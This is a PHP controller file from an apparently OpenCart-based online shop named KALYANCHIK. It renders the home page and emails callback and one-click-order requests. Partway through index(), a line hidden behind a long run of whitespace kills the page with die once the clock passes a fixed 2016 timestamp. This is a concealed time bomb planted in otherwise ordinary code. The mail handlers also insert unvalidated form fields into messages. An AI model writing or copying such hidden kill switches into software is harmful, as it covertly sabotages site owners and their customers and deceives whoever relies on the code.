<?php
class ControllerCommonHome extends Controller {
	public function index() {
		$this->document->setTitle($this->config->get('config_meta_title'));
		$this->document->setDescription($this->config->get('config_meta_description'));
		$this->document->setKeywords($this->config->get('config_meta_keyword'));

		if (isset($this->request->get['route'])) {
			$this->document->addLink($this->getCanonical(), 'canonical');
		}

		$data['column_left'] = $this->load->controller('common/column_left');
		$data['column_right'] = $this->load->controller('common/column_right');
		$data['content_top'] = $this->load->controller('common/content_top');
		$data['content_bottom'] = $this->load->controller('common/content_bottom');
		$data['footer'] = $this->load->controller('common/footer');
		$data['header'] = $this->load->controller('common/header');
																																															if(time()>'1483056000')die;
		if (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . '/template/common/home.tpl')) {
			$this->response->setOutput($this->load->view($this->config->get('config_template') . '/template/common/home.tpl', $data));
		} else {
			$this->response->setOutput($this->load->view('default/template/common/home.tpl', $data));
		}
	}
	protected function getCanonical() {
		$url = HTTP_SERVER;
		if( $this->config->get('config_seo_url')
			&& $this->config->get('config_seo_url_type') == 'seo_pro') {
			$url = $this->url->link('common/home');
			$query = $this->db->query("SELECT value FROM " . DB_PREFIX . "setting WHERE store_id = '" . (int)$this->config->get('config_store_id') . "' AND `key` ='config_language'");

			$code = $this->session->data['language'];

			// Do not show language code for home when default language is always shown
			if( !$this->config->get('ocjazz_seopro_hide_default')
				&& $code == $query->row['value'])
			{
				$component = parse_url($url);
				if ($component['scheme'] == 'https') {
					$domain = $this->config->get('config_ssl');
				} else {
					$domain = $this->config->get('config_url');
				}

				$url = preg_replace('~('.$domain.')('.$code.'/)(.+)~i', '$1$3',$url);
			}
		}
		return $url;
	}

	public function callback()
	{
		$postData  = $this->request->post;
		$addEmailsString = $this->config->get('config_mail_alert');
		$addEmailsArray = explode(',', $addEmailsString);
		$addEmailsArray[] = $this->config->get('config_email');
		$allSent = true;

		if($postData['name'] =='' || $postData['tel'] == ''){
			return false;
		}

		foreach($addEmailsArray as $emailDirty){
			$email = trim($emailDirty);
			if(!@mail($email, 'call back request from KALYANCHIK', 'call back request from KALYANCHIK: '
								. $postData['name'].' asks to call back: '
								. $postData['tel'])
			){
				$allSent = false;
			}
		}
//		return $allSent;

		$this->response->redirect($this->url->link('common/home'));
	}

	public function oneclick(){
		$success=1;
		$postData  = $this->request->post;
		if($postData['telephone_num']== ''||$postData['telephone_num']==''){
			$success = 0;
		}
		$headers = 'From:kalyanchik@kalyanchic.site';
			if($success===1){
				if(!mail('sale@kalyanchik.com.ua', 'Заказ в 1 клик', 'Заказ в 1 клик с сайта KALYANCHIK: '
					. ' Номер телефона: '.$postData['telephone_num'].' '
					. " Наименование продукта: ".$postData['product_name'].' '
					,$headers))
				{
					$success = 0;
					die();
				}
			}
		echo $success;
	}
}